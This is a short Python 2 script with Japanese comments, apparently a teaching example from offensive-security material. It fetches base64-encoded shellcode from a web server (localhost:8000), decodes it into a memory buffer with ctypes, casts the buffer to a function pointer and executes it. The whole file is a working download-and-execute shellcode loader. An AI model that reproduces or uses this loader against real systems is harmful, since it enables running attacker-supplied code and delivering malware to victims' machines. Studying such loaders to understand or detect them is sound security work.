# -*- coding: utf-8 -*-
import urllib2
import ctypes
import base64

# Webサーバーからシェルコードを取得
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url)

# Base64デコードを行ってシェルコードを取り出す
shellcode = base64.b64decode(response.read())

# メモリー上にバッファーを作成
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# シェルコードを指す関数ポインタを作成
shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# シェルコードの呼び出し
shellcode_func()